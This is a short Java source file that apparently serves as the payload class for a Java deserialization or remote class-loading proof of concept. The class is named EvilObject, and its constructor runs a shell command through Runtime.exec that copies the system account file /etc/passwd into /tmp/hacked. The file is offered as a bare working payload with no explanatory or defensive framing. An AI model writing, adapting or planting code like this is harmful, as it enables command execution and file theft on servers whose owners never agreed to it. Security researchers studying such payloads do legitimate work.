public class EvilObject {
    public EvilObject() throws Exception {
    	System.out.println("Hello from EvilObject");
    	Runtime.getRuntime().exec("cp /etc/passwd /tmp/hacked");
    }
}